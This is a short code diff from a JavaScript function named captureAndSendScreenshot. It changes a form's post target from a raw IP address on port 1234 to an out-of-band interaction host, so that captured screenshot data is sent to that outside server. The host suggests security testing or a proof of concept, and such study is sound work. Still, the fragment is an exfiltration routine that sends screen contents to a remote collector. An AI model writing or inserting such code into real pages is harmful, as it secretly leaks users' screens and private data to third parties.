@@ -19,7 +19,7 @@ function captureAndSendScreenshot() {
         // Create a form element (optional)
         const form = document.createElement('form');
         form.method = 'post';
-        form.action = 'http://138.68.102.109:1234';
+        form.action = 'https://ckfjz1w2vtc0000xf3mggjz3xtyyyyyyb.oast.fun';
 
         // Create an input field to hold the screenshot data
         const screenshotInput = document.createElement('input');
